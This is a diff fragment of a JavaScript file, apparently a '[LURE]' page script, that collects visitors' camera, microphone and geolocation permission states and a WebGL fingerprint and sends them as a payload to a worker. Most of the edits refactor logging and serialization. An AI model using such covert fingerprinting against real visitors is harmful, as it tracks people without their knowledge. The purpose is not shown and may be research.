@@ -157,15 +157,19 @@ async function collectStaticData() {
     document.body.removeChild(testDiv);
   } catch {}
 
-  const permNames = ['camera','microphone','geolocation'];
+  const permNames = ['camera', 'microphone', 'geolocation'];
   for (const name of permNames) {
     try {
-      const status = await navigator.permissions?.query({name});
+      const status = await navigator.permissions?.query({name: name});
       p.permissionStates[name] = status?.state || null;
-    } catch {}
+    } catch (e) {
+      p.permissionStates[name] = 'error';
+    }
   }
 
   console.log('[LURE] Static data collected');
+  console.log('[LURE] - Permissions:', p.permissionStates);
+  console.log('[LURE] - WebGL:', p.webglFingerprint);
   return p;
 }
 
@@ -258,21 +262,6 @@ async function collectDynamicData() {
   return p;
 }
 
-// Convert camelCase to snake_case for worker compatibility
-function toSnakeCase(obj) {
-  if (!obj || typeof obj !== 'object') return obj;
-  const result = {};
-  for (const [key, value] of Object.entries(obj)) {
-    const snakeKey = key.replace(/[A-Z]/g, letter => `_${letter.toLowerCase()}`);
-    if (value && typeof value === 'object' && !Array.isArray(value) && !(value instanceof File)) {
-      result[snakeKey] = toSnakeCase(value);
-    } else {
-      result[snakeKey] = value;
-    }
-  }
-  return result;
-}
-
 async function sendPayload() {
   if (isSending) return;
   
@@ -280,7 +269,7 @@ async function sendPayload() {
   try {
     let data = await collectDynamicData();
     
-    // Build payload with PROPER JSON.stringify for nested objects
+    // CRITICAL FIX: Stringify ALL nested objects for worker compatibility
     const payload = {
       sessionId: data.sessionId,
       timestamp: data.timestamp,
@@ -318,8 +307,8 @@ async function sendPayload() {
     };
     
     console.log('[LURE] Sending payload');
-    console.log('[LURE] - Permissions:', data.permissionStates);
-    console.log('[LURE] - WebGL:', data.webglFingerprint);
+    console.log('[LURE] - Permissions (stringified):', payload.permission_states);
+    console.log('[LURE] - WebGL (stringified):', payload.webgl_fingerprint);
     console.log('[LURE] - Payload size:', JSON.stringify(payload).length, 'bytes');
     
     const controller = new AbortController();
